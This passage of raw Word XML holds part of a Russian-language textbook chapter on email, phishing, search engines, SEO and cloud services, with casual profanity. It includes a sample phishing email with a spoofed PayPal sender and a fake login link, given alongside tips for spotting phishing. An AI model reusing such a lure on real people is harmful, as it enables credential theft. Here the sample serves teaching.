      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`ivan.petrov@yandex.ru`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`ceo@apple.com`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`student123@phystech.edu`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Факт</w:t>
      </w:r>
      <w:r>
        <w:t>: В русском языке символ @ называется "собака", в английском "at" (ат), в немецком "Klammeraffe" (обезьянка). В Китае его называют "мышка". 🐀</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Почтовые клиенты и веб-почта</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Почтовый клиент</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — программа для работы с почтой.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Десктопные клиенты</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Outlook** (Microsoft, популярен в корпорациях)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Thunderbird** (Mozilla, open-source)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Apple Mail** (для macOS/iOS)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Веб-почта</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (через браузер):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Gmail** (Google, ~1.8 млрд пользователей)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Outlook.com** (бывший Hotmail)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Яндекс.Почта**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Mail.ru**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы веб-почты</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: доступ с любого устройства, не нужно устанавливать ПО.  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы</w:t>
      </w:r>
      <w:r>
        <w:t>: требуется интернет, медленнее десктопных клиентов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Протоколы почты (краткое напоминание из главы 8.04)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SMTP (Simple Mail Transfer Protocol)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — отправка почты.  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Порт: **25** (между серверами), **587** (от клиента к серверу с аутентификацией)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>POP3 (Post Office Protocol v3)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — получение почты (скачивание с удалением с сервера).  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Порт: **110** (незащищённый), **995** (с TLS)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>IMAP (Internet Message Access Protocol)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — работа с почтой на сервере (синхронизация).  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Порт: **143** (незащищённый), **993** (с TLS)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Золотое правило</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: используй </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>IMAP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (письма синхронизируются между устройствами), а не POP3 (письма исчезают после скачивания).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Спам и фишинг</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Спам</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — нежелательные письма (реклама, "нигерийские принцы", казино).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Статистика</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>45-50%</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> всех email-сообщений — это спам.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как борются</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**SPF, DKIM, DMARC** (проверка подлинности отправителя)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Байесовские фильтры** (машинное обучение)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Чёрные списки** (RBL — Realtime Blackhole List)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Фишинг</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — попытка выудить логины/пароли через поддельные письма.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример фишинга</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>От: security@paypaI.com (заметил? вместо l — I)</w:t>
        <w:br/>
        <w:t>Тема: Ваш аккаунт заблокирован!</w:t>
        <w:br/>
        <w:t>Текст: Перейдите по ссылке и введите логин/пароль: http://paypal-security.ru/login</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как не попасться</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Проверяй **адрес отправителя** (не `paypaI.com`, а `paypal.com`)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Наводи мышку на ссылки (проверяй реальный URL)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Не вводи пароли на подозрительных сайтах</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.5.3. Поисковые системы: Гуглим всё подряд</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Поисковая система (search engine)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — сервис для поиска информации в интернете.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Топ-3 поисковика мира (2025)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Поисковик | Доля рынка | Страна | Особенности |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|-----------|-----------|--------|-------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Google</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | ~92% | США | Самый точный, индексирует ~50 млрд страниц |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Bing</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | ~3% | США | От Microsoft, интегрирован в Windows |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Яндекс</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | ~2% (в России ~60%) | Россия | Лучше для русскоязычного контента |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Baidu</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | ~1% (в Китае ~70%) | Китай | Цензурируется правительством |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>DuckDuckGo</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | ~0.5% | США | Не отслеживает пользователей (анонимность) |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Как работает поисковик</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Три этапа</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Краулинг (Crawling)** — робот (crawler, spider, bot) обходит веб-сайты по ссылкам.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Googlebot посещает ~15 миллиардов страниц **в день**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Индексация (Indexing)** — страницы анализируются и сохраняются в базу данных.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Извлекаются ключевые слова, заголовки, мета-теги</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Размер индекса Google: ~100+ петабайт</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Ранжирование (Ranking)** — при поиске страницы сортируются по релевантности.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Google использует **200+ факторов** для ранжирования</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Алгоритм **PageRank** (оценка важности по количеству ссылок)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Ты ищешь "котики".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Google ищет в индексе все страницы со словом "котики"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Сортирует их по релевантности (сначала популярные сайты с котиками)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Показывает топ-10 результатов на первой странице</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Факт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>95%</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> пользователей не листают дальше первой страницы поиска. Попасть на первую страницу = $$$.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>SEO (Search Engine Optimization) — как попасть в топ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SEO</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — оптимизация сайта для поисковиков (чтобы он был выше в результатах).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Основы SEO</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Ключевые слова** (keywords) в заголовках и тексте</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Мета-теги** (`&lt;meta name="description"&gt;`)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Обратные ссылки** (backlinks) — другие сайты ссылаются на твой</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Скорость загрузки** (медленный сайт = штраф от Google)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Мобильная версия** (60% поиска с телефонов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**HTTPS** (незащищённые сайты понижаются)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Чёрная шляпа (Black Hat SEO)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — нечестные методы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Скрытый текст (белый текст на белом фоне)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Keyword stuffing (нахуячить ключевых слов 1000 раз)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ссылочные фермы (покупка тысяч левых ссылок)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вердикт</w:t>
      </w:r>
      <w:r>
        <w:t>: Google банит за Black Hat. Не стоит.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.5.4. Облачные сервисы: "Твои файлы — на сервере дяди Васи"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Облачные сервисы (cloud services)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это когда данные и вычисления происходят </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>не на твоём компьютере</w:t>
      </w:r>
      <w:r>
        <w:t>, а на серверах в интернете.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Облачное хранилище (Cloud Storage)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Облачное хранилище</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — диск в интернете. Файлы хранятся на серверах провайдера.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Популярные сервисы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Сервис | Бесплатно | Платно | Особенности |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|--------|-----------|--------|-------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Google Drive</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | 15 ГБ | $1.99/мес за 100 ГБ | Интеграция с Gmail, Google Docs |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Dropbox</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | 2 ГБ | $9.99/мес за 2 ТБ | Первый популярный облачный диск (2008) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>OneDrive</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | 5 ГБ | $2/мес за 100 ГБ | Интеграция с Windows, Office 365 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Яндекс.Диск</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | 5 ГБ | ₽75/мес за 100 ГБ | Быстрый для России |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>iCloud</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | 5 ГБ | $0.99/мес за 50 ГБ | Для Apple-устройств |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы облака</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Доступ с любого устройства</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Автобэкапы (не потеряешь данные)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Синхронизация между устройствами</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы облака</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Требуется интернет</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ограничение по размеру</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Зависишь от провайдера (если сервис закроется — пиздец)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Облачные вычисления: IaaS, PaaS, SaaS</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Три модели облаков</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1. IaaS (Infrastructure as a Service)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — аренда виртуальных серверов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры</w:t>
      </w:r>
      <w:r>
        <w:t>: AWS EC2, Google Compute Engine, Azure Virtual Machines</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что получаешь</w:t>
      </w:r>
      <w:r>
        <w:t>: процессор, память, диск (ты сам ставишь ОС и софт)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Для кого</w:t>
      </w:r>
      <w:r>
        <w:t>: для разработчиков и DevOps (полный контроль)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2. PaaS (Platform as a Service)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — платформа для разработки (инфраструктура + ОС + среда выполнения).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры</w:t>
      </w:r>
      <w:r>
        <w:t>: Heroku, Google App Engine, Azure App Service</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что получаешь</w:t>
      </w:r>
      <w:r>
        <w:t>: платформу для запуска приложений (ты заливаешь код, остальное — их проблема)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Для кого</w:t>
      </w:r>
      <w:r>
        <w:t>: для разработчиков (не надо настраивать серверы)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>3. SaaS (Software as a Service)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — готовое приложение в браузере.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры</w:t>
      </w:r>
      <w:r>
        <w:t>: Gmail, Google Docs, Zoom, Spotify, Netflix</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что получаешь</w:t>
      </w:r>
      <w:r>
        <w:t>: готовое приложение (не нужно ничего устанавливать)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Для кого</w:t>
      </w:r>
      <w:r>
        <w:t>: для всех пользователей (просто открыл браузер и пользуешься)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сравнение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Модель | Кто управляет инфраструктурой | Пример |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|--------|-------------------------------|--------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>On-Premise</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (свой сервер) | Ты сам | Свой сервер в подвале |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>IaaS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Провайдер даёт железо, ты настраиваешь | AWS EC2 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>PaaS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Провайдер даёт железо + ОС, ты пишешь код | Heroku |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
